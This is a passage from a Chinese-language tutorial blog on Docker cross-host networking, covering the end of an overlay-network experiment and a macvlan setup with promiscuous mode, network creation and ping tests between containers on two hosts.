<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tomcat</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mynet</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 8080:8080</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tomcat:alpine</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> #和主节点指定同一个网络</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ping</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -w</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.31.0.1</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #尝试在从节点上去ping主节点的nginx的虚拟ip</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>发现，通过该方式（在/etc/docker/daemon.json中配置）是可以实现跨宿主机通信的。</p>
<p>注：该方式，在容器内部不能使用容器别名相互识别，也就是说A容器内部，不识别B容器的别名，尽管他们都共同链接一个网络mynet，但是仅能够通过各自的虚拟IP互通。如要实现容器内部互认别名，点进入点击进入。</p>
<h3>6.在从节点上不使用自定义的overlay网络模式开启tomcat，尝试和nginx互通</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -f</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tomcat</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -it</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tomcat</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 8080:8080</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tomcat:alpine</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  /bin/bash</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ping</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -w</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.31.0.1</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>发现从节点，在启动tomcat时不指定network为(主节点)自定义的mynet网络，也是可以ping通nginx的虚拟IP，从而实现跨宿主机通信。</p>
<h3>7.扩展</h3>
<blockquote>
<p>上例配置的是overlay，实验结果表明，只要在daemon.json中配置了集群的主节点和广播节点，无论子节点容器启动时，是否用 <code>--network</code> ，从节点都可以正常访问访问主节点，从而实现了跨宿主机通信。</p>
<p>但是，在跟随老师的课程学习中，老师的主节点、从节点的 <code>daemon.json</code> 中配置的网络模式是 <code>overlay2</code>，老师的实验结果和我的实验结果是有出入的，也就是，当从节点的容器启动时不用 <code>--network mynet</code> 来指定和主节点同一个网络，那么在从节点中就无法实现跨宿主机通信（不能在从节点ping通主节点）。</p>
</blockquote>
<p>奇葩的是，按老师的配置overlay2,经过反复实验，关键的几个步骤入下：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -f</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> $(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ps</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -qa</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)   </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#在主从节点都执行，清空容器</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vim</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/docker/daemon.json</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #把里面的overlay修改为overlay</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rm</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mynet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> daemon-reload</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> restart</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote>
<p>...其他步骤和上面都一致，重新创建mynet报错时，docker ps -a 看一下consul启动没，没有启动的话，启动一下。</p>
<p>最终无法得到老师的答案，无论配置overlay2还是overlay，都可以实现跨宿主机通信，而不是老师的，只要从节点不用--network指定和主节点同一个网络，就不能实现跨宿主机通信。</p>
</blockquote>
<p>注：在反复实验过程中，偶尔有一次，不带 <strong>--network</strong>，在从节点的容器内部不能ping通主节点nginx的虚拟ip，奇怪的是，反复，多次实验，这个仅有1次的ping不通，竟然还原不了，每次又都能ping通了。</p>
<h3>8.小结</h3>
<p>overlay网络模式，核心三步：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1.修改主、从节点的daemon.json，使主从节点通过ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 集群信息关联；</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2.在master节点创建自定义网络mynet并指定网络模式为overlay</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">3.让主、从节点的容器启动时，都指定该自定义网络mynet。</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">好处：在主节点创建overlay网络，从节点自动可以通过daemon.json获取主节点创建的自定义网络。</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>最终，只要在daemon.json中配置好了集群信息，主节点的容器启动时，指定自定义网络mynet(创建时用-d指定为overlay或者overlay2)主从节点就可以愉快的实现跨宿主机通信。</p>
<h2>二、macvlan</h2>
<p>Macvlan的4种模式</p>
<ul>
<li>Bridge</li>
<li>Private</li>
<li>VEPA</li>
<li>Passthrough</li>
</ul>
<p>该模式现在用的比较少，作为了解内容可以拓展一下知识面。</p>
<p>它本身不创建网络，使用的是物理机的网卡，它会导致物理机物理网卡失效，借此会创建虚拟网卡，给虚拟网卡分配网络资源，IP等。</p>
<p>macvlan这种技术能将一块物理网卡虚拟成多块虚拟网卡 ，相当于物理网卡施展了多重影分身之术 ，由一个变多个。</p>
<p>弊端：可能会耗尽物理IP地址，网段内接入的物理机越多，广播的效率/性能就会下降。</p>
<p>该模式，对Linux系统的内核版本是有要求的，支持的版本有 v3.9-3.19 和 4.0+，比较稳定的版本推荐 4.0+。它一般是以内核模块的形式存在，我们可以通过以下方法判断当前系统是否支持：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">modprobe</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> macvlan</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #如果没有返回任何信息，代表支持</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lsmod</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">grep</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> macvlan</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #如果返回如下信息，代表支持</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">macvlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">                19239</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>1.据需清理掉上面的实验数据，并还原daemon.json实验前的默认配置</h3>
<h1>如果是实验数据，可以清除，清除前请确保你明白下面命令的含义，否则不要这么清除</h1>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -f</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> $(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ps</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -qa</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#清除所有的容器</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rmi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> $(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> images</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -qa</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#清除掉所有镜像</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rm</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mynet</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #在主节点清除掉自定义的网络</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> daemon-reload</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #重启配置</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> restart</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #重启docker服务</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>提示，我的本地daemon.json里，只有一行，是配置阿里云加速镜像时创建的。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mkdir</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/docker</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tee</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/docker/daemon.json</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> .......</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h3>2.分别在主从节点上，开启网卡混合模式，开启前先ip a查看网卡信息</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> a</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ens33</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> promisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #特别注意，你的物理虚拟网卡名称可能是eth0（可以在network-script里修改）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> a</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>开启混合模式前，先查看一下网卡信息</p>
<p>分别给主从节点，开启混合网卡模式</p>
<h3>3.分别在主从节点上，通过docker create -d 创建macvlan网络</h3>
<p>分别在主、从节点上创建macvlan，并通过 parent指定其真身爸爸是物理网卡ens33。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#部分主机的虚拟物理网卡不是ens33,部分名称是eth0 ,(我自定义名称是myMaclan，不是myMacvlan，叫什么随意)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> create</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> macvlan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --subnet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 172.30.0.0/16</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --gateway</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.30.0.2</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> parent=ens33</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> myMaclan</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> create</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> macvlan</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --subnet=ip段（10.10.10.0/24）</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --gateway=网关</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> parent=网卡名称</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> macvlan_mode=bridge</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bridgemacvlan（网络名称）</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ls</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>注：对该命令的参数不了解的小伙伴，可以通过docker network create  --help来获悉更多的参数。细心的小伙伴发现，第一个案例该命令创建overlay网络时，使用的是--opt，此处使用的是-o，它们两个是一个命令，-o等价于--opt，使用场景主要是用于多个参数时，放到对应参数前面。它是一个map[]集合，也就是说，每个参数的前面都添加-o，则这些参数同属于一个-o的集合。</p>
<h3>4.在主节点CentOS 7.9上使用macvlan网络模式，启动nginx并指定IP</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> myMacvlan</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --ip</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.30.0.3</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx:alpine</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> XXX</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --net=bridgemacvlan</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --ip=容器ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> XXX/XXX:latest</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ps</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>注意：这里自定义nginx容器的ip是172.30.0.3，下个步骤在从节点tomcat容器内会用到。</p>
<h3>5.在从节点CentOS8.4上，启动tomcat容器时，分别暂不/指定网络模式为macvlan，ping主节点的nginx</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> images</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> #查看镜像列表（什么镜像不重要，重要的是在容器内部，是可以实现跨宿主机通信）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -it</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tomcat:alpine</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bash</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #第一次进入从节点容器内部，不指定--network</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ping</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -w</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.30.0.3</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">   #尝试去ping主节点容器内的nginx的ip，发现不能ping通</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">exit</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -it</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> myMaclan</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tomcat:alpine</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bash</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #第二次进入从节点容器内部，指定--network</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ping</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -w</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.30.0.3</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">   #尝试去ping主节点容器内的nginx的ip，发现可以ping通</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">exit</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>注：如果你对尾部的bash感兴趣，点击进入（从文章尾部开始向上看）</p>
<h3>6.收尾工作，关闭虚拟网卡混合模式，清除容器</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -f</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> $(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ps</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -qa</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)   </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#清除容器</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ls</span></span>
